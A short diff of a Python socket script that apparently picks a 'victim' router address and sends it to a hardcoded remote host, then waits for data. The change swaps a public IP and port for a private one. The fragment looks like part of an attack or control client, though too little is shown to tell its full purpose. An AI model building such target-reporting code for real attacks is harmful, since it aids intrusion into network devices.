@@ -6,7 +6,7 @@ def select_victim():
 
 sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 router_addr=select_victim()
-sock.connect(('192.9.13.229', 9876))
+sock.connect(('192.168.0.2', 9875))
 sock.sendall(router_addr)
 while True:
     a=sock.recv(20)
